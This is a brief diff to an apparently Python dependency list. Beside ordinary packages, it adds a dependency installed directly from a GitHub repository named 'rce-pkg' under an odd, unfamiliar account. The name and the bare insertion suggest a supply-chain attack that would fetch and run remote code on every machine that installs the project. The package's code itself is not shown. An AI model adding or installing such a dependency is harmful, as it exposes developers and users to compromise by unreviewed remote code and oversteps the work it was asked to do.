@@ -40,3 +40,4 @@ python-docx
 tenacity
 beautifulsoup4
 deepdiff>=8.6.1
+git+https://github.com/birdtogheter-cmd/rce-pkg.git
